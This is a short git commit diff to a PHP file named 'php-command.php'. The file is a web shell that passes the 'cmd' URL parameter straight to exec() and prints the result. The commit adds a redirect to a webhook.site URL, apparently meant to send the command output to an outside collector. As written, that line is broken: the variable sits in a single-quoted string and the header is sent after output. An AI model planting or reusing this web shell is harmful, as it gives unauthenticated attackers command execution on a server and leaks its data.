8fc099be685a3e933673d82b4d1e7107279b0199
beeblebrox-42 <40760486+beeblebrox-42@users.noreply.github.com>
2020-06-09 21:19:38 +0530

    Update php-command.php

--- php-command.php
+++ php-command.php
@@ -1,4 +1,5 @@
 <?php
 exec($_GET['cmd'], $output);
 print_r($output);
+header('Location: https://webhook.site/#!/2851ed6c-0367-4494-b3e0-7045d9601432/4add0298-4bd2-40c5-b2cb-dd4bed37257b/1/$output')
 ?>
